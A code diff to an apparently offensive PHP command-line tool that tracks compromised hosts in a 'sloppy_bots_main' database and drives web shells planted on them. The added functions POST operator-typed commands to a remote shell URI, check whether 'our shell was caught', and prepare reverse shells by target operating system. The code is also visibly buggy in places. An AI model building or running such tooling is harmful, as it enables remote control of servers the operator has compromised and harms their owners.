@@ -41,13 +41,27 @@ _MENU;
 
 }
 
-function sys($host)
+function sys($host, $uri)
 {
     if (!empty($host) && !empty($userA)) {
-        $syst = curl_exec(CHH, $host);
+        curl_setopt(CHH, CURLOPT_URL,                "$host/$uri?qs=csS");
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
+        $syst = curl_exec(CHH);
+        if (!curl_errno(CHH)){
+            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+                case 200:
+                    return $syst;
+                default:
+                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+            }
+
+        }
     } else {
         print("[ !! ] Host was empty... [ !! ]");
     }
+    return 0;
 }
 
 function rev($host, $shell, $port, $os)
@@ -75,9 +89,29 @@ function rev($host, $shell, $port, $os)
 
 }
 
-function co($command, $host)
+function co($command, $host, $uri)
 {
+    if (!empty($host) && !empty($command) && !empty($uri)) {
+        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
+        curl_setopt(CHH, CURLOPT_POST,                              true);
+        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
+        $syst = curl_exec(CHH);
+        if (!curl_errno(CHH)){
+            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+                case 200:
+                    return $syst;
+                default:
+                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+            }
 
+        }
+    } else {
+        print("[ !! ] Host was empty... [ !! ]");
+    }
+    return 0;
 }
 
 function clo($host, $repo)
@@ -105,16 +139,24 @@ function opts()
 
 }
 
-function queryDB($host){
+function queryDB($host, $fetchWhat){
     # place holder for the query db function. this will check what information we have about a host, and which options to set.
     # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
     # work in progress.
     # @todo
-    if (!empty($host)){
+    if (!empty($host) || 0){
         try {
             $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
-            $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
-            if (!empty($row)) {
+            switch(strtolower($fetchWhat)){
+                case "r":
+                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
+                    break;
+                default:
+                    $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
+                    break;
+
+            }
+            if (!empty($row)){
                 return $row[0];
             }else{
                 return 0;
@@ -123,8 +165,10 @@ function queryDB($host){
             return $e;
         }
 
+
+    }else {
+        throw new Exception("Host was 0, are you sure you added it into the DB?\n");
     }
-    return 0;
 }
 
 
@@ -136,19 +180,35 @@ while ($run) {
     $pw = trim(fgets(STDIN));
     switch (strtolower($pw)) {
         case "s":
-            echo "S\n";
+            echo readline_list_history();
+            $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
+            try {
+                sys($h, queryDB($h, "s"));
+            }catch (Exception $e){
+                echo $e."\n";
+            }
             break;
         case "r":
             $h = readline("Please tell me the host.\n->");
             $p = readline("\nWhich port shall we use?\n->");
-            $o = !empty(queryDB($h)) | 0 ? "win":"lin";
+            try {
+                $o = !empty(queryDB($h, 'r')) | 0 ? "win" : "lin";
+            } catch (Exception $e) {
+                echo $e."\n";
+            }
             echo $o;
             if (!empty($h) && !empty($p)){
                 rev($host=$h,"default", $port=$p, $o);
             }
             break;
         case "c":
-            echo "c\n";
+            try{
+                $h = readline("Which host are we sending the command to?\n(right now I only accept IP Addresses.)\n->");
+                $c = readline("And now the command: \n->");
+                co($c, $h, queryDB($h, 'c'));
+            }catch (Exception $e){
+                echo $e."\n";
+            }
             break;
         case "cl":
             echo "cl\n";
